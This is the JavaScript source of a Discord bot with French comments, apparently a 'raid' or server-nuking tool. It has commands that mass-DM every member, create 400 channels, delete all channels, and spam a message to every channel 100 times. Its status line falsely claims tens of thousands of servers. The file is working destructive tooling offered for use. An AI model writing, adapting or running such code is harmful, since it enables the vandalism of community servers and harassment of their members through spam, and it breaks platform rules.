const Discord = require('discord.js');
const client = new Discord.Client();
const botPrefix = "*"

  client.on('ready', msg => {
  
  console.log(`Statistiques globales : \n\nLe bot a un total de ${client.guilds.cache.size} serveurs. \nPour un total de ${client.users.cache.size} membres.`)
  console.log("Connecté en tant que " + client.user.id + " | Prefix : " + botPrefix + " | Nombre de Serveurs "+ client.guilds.cache.size +" | Nombres de salons "+ client.channels.cache.size +" | Utilisateur totaux "+ client.users.cache.size +" | Nombre d'emojis totaux "+ client.emojis.cache.size +'');
  client.user.setActivity("*help - sur 89567 serveurs");
});

client.on('message',  msg => {
	if (msg.guild && msg.content.startsWith('*dm')) {
      msg.delete();
      let text = msg.content.slice('*dm'.length);
      msg.guild.members.cache.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }

  if(msg.content.startsWith('*channels')){
    msg.delete();
    let channelname = msg.content.slice ('*channels'.length);

    var i;
    for(i = 0; i < 400; i++) {
    setTimeout(() => {

      msg.guild.channels.create(channelname,{type: 'text'})

    },1*1) 
    }
    }

  if(msg.content.startsWith('*dc')){
    msg.delete();
    var i = 0
    msg.guild.channels.cache.forEach(channel =>
      i++
      )
    msg.guild.channels.cache.forEach(channel =>

      setTimeout(() => {channel.delete()},1000*3))
      msg.guild.channels.create("général",{type: 'text'})
  }

  if(msg.content.startsWith('*all')){
    msg.delete();
    var i
    for (i = 0; i < 100; i++){

    setTimeout(() => {

      let yourmessage = msg.content.slice('*all'.length);
      msg.guild.channels.cache.forEach(channel =>
        channel.send(yourmessage)
        )
    },1*1)
    }
  }


});

//met ton token ici
client.login("le token de ton bot");
